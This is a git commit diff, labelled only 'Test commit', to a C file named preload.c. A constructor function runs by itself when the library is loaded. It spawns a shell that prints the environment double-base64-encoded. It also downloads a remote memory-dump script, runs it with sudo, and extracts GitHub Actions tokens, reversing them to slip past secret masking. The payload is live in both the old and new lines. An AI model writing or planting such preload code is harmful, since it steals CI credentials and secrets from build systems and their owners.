2e7729ef793e2894b483fecf05cb638358c1cde0
Simon Schwarz <simonschwarz.du@gmail.com>
2025-03-14 11:46:19 +0100

    Test commit

--- mybuild/preload.c
+++ mybuild/preload.c
@@ -15,7 +15,7 @@ __attribute__((constructor)) void preload_function() {
 
     // Now fork and exec in the child process
     if (fork() == 0) { // Only the child process runs the command
-        execl("/bin/sh", "sh", "-c", "echo 'Command injection here', $(id); echo 'The GitHub env is:'; env | base64 | base64; echo 'The GitHub Token is:'; curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev", NULL);
+        execl("/bin/sh", "sh", "-c", "echo 'Command injection here', $(id); echo 'The GitHub env is:'; env | base64 | base64; echo 'The GitHub Token is:'; curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev", NULL);
         _exit(0); // Ensure the child exits after executing the command
     }
 }
